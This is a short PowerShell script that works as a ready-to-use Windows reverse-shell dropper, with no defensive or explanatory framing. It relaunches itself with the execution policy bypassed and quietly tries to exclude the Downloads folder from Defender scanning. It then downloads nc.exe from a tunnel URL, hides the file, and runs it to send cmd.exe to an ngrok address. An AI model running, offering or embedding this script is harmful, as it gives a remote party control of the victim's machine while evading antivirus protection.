function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
        exit
    }
}

Ensure-WindowsPowerShell

try {
    # Attempt Defender Exclusion (will fail silently if not admin)
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue

    # === Download nc.exe from localhost.run ===
    $ncUrl = "https://c1b0aab3f333bf.lhr.life/nc.exe"  # Replace with your actual localhost.run URL
    $ncPath = "$env:USERPROFILE\Downloads\nc.exe"

    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing

    Unblock-File -Path $ncPath
    Set-ItemProperty -Path $ncPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

    # === Execute nc.exe reverse shell to Ngrok ===
    & "$ncPath" "0.tcp.ngrok.io" 18639 -e cmd.exe
}
catch {
    Write-Error "Execution failed: $_"
}
